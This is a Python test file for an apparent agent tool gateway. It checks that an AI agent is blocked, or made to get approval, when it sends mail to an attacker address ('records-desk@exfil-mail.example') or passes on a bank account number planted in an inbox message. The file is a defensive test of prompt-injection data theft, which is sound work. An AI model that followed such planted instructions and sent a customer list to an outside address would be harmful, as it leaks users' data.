from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from judikt.policy import PolicyConfigurationError, validate_policy_config
from judikt.runtime import JudiktRuntime

PROJECT_ROOT = Path(__file__).resolve().parents[1]
ATTACKER = "records-desk@exfil-mail.example"


class GatewayProvenanceTest(unittest.TestCase):
    def _runtime(self, directory: str, mode: str | None) -> JudiktRuntime:
        policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
        policy["allowed_tools"]["mail"] = ["read_inbox", "send_email"]
        for patterns in policy["actor_permissions"].values():
            patterns.extend(["read_inbox", "send_email"])
        if mode is not None:
            policy["untrusted_provenance"] = {"mode": mode}
        policy_path = Path(directory) / "policy.json"
        policy_path.write_text(json.dumps(policy))
        upstream_path = Path(directory) / "upstreams.json"
        upstream_path.write_text(
            json.dumps(
                {
                    "servers": {
                        "mail": {
                            "command": [
                                sys.executable,
                                str(PROJECT_ROOT / "tests" / "fixtures" / "provenance_mcp_server.py"),
                            ]
                        }
                    }
                }
            )
        )
        environment = patch.dict(os.environ, {"JUDIKT_UPSTREAM_CONFIG": str(upstream_path)})
        environment.start()
        self.addCleanup(environment.stop)
        runtime = JudiktRuntime(policy_path, Path(directory) / "audit.db")
        self.addCleanup(runtime.close)
        return runtime

    def test_send_to_an_address_planted_in_an_email_needs_approval(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)

            blocked = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "customer list"})
            self.assertFalse(blocked.allowed)
            self.assertEqual(blocked.rule, "untrusted_provenance")
            self.assertEqual(blocked.action, "REQUIRE_APPROVAL")
            self.assertIn("untrusted_provenance:email:mail/read_inbox", blocked.evidence)
            self.assertIn("mail/read_inbox", blocked.reason)

            sender = runtime.call_tool("mail", "send_email", {"to": "boss@corp.example", "body": "invoice is in"})
            self.assertTrue(sender.allowed)

            arguments = {"to": ATTACKER, "body": "customer list"}
            token = runtime.policy.issue_approval(
                actor="reviewer", reason="checked", server="mail", tool="send_email", arguments=arguments
            )
            approved = runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token})
            self.assertTrue(approved.allowed, approved.reason)
            replayed = runtime.call_tool("mail", "send_email", {**arguments, "approval_token": token})
            self.assertFalse(replayed.allowed)

    def test_a_planted_account_number_is_caught_inside_free_text(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            runtime.call_tool("mail", "read_inbox", {})
            blocked = runtime.call_tool(
                "mail", "send_email", {"to": "boss@corp.example", "body": "paid DE89 3704 0044 0532 0130 00"}
            )
            self.assertEqual(blocked.rule, "untrusted_provenance")

    def test_report_mode_allows_and_records_evidence(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "report")
            runtime.call_tool("mail", "read_inbox", {})
            result = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "customer list"})
            self.assertTrue(result.allowed)
            self.assertIn("untrusted_provenance:email:mail/read_inbox", result.evidence)

    def test_deny_and_off_modes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "deny")
            runtime.call_tool("mail", "read_inbox", {})
            denied = runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "x"})
            self.assertEqual((denied.rule, denied.action), ("untrusted_provenance", "DENY"))
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, "off")
            runtime.call_tool("mail", "read_inbox", {})
            self.assertTrue(runtime.call_tool("mail", "send_email", {"to": ATTACKER, "body": "x"}).allowed)

    def test_policy_files_reject_an_unknown_mode(self) -> None:
        policy = json.loads((PROJECT_ROOT / "config" / "policies.yaml").read_text())
        policy["untrusted_provenance"] = {"mode": "block"}
        with self.assertRaisesRegex(PolicyConfigurationError, "untrusted_provenance.mode"):
            validate_policy_config(policy)

    def test_read_tools_are_never_gated(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            runtime = self._runtime(directory, None)
            runtime.call_tool("mail", "read_inbox", {})
            self.assertTrue(runtime.call_tool("mail", "read_inbox", {}).allowed)


if __name__ == "__main__":
    unittest.main()
